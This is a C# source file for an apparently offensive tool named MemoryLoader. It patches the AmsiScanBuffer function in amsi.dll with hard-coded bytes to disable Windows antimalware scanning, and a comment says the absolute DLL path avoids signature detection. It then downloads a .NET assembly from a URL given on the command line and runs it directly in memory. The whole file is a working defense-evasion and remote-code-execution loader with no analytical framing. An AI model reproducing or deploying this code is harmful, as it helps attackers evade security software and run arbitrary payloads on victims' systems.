using System.Reflection;
using System.Threading;
using System;
using System.Runtime.InteropServices;


namespace MemoryLoader
{
    class Program
    {
        // Implement required kernel32.dll functions 
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);


        static void Main(string[] args)
        {
            
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: Loader.exe [URL]");
                return;
            }


            // Patch AMSI!
            PatchAMSI();

            Console.WriteLine("Loading From Memory...");

            byte[] binary = null;

            try
            {
                Console.WriteLine($"Downloading: {args[0]}...");
                binary = new System.Net.WebClient().DownloadData(args[0]);

            }
            catch
            {
                Console.WriteLine("Could Not Download File");
                return;
            }

            if (binary != null)
            {
                try
                {
                    MemoryUtils.RunFromMemory(binary);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error Running Downloaded File");
                    Console.WriteLine(ex);
                }
            }

            else
            {
                Console.WriteLine($"Downloaded File is Null");
                return;
            }
        }

        static void PatchAMSI()
        {
            // Modified from: https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs

            Console.WriteLine("Patching AMSI...");
            
            // Get the DLL. Absolute path isn't flagged by signature detection
            var library = LoadLibrary("C:\\Windows\\System32\\amsi.dll");

            // Get the AmsiScanBuffer process
            var scanBuff = GetProcAddress(library, "AmsiScanBuffer");

            var patch = AMSIPatch;

            VirtualProtect(scanBuff, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
            Marshal.Copy(patch, 0, scanBuff, patch.Length);
            VirtualProtect(scanBuff, (UIntPtr)patch.Length, oldProtect, out uint _);

            Console.WriteLine("AMSI patched!");
            return;
        }

        static byte[] AMSIPatch
        {
            get
            {
                // 64 bit
                if (IntPtr.Size == 8)
                {
                    return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                }

                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }
        }
    }

    public static class MemoryUtils
    {
        public static Thread RunFromMemory(byte[] bytes)
        {
            var thread = new Thread(new ThreadStart(() =>
            {
                var assembly = Assembly.Load(bytes);
                MethodInfo method = assembly.EntryPoint;
                if (method != null)
                {
                    string[] args = {};
                    method.Invoke(null, new object[] {args});
                }
            }));

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            return thread;
        }
    }
}
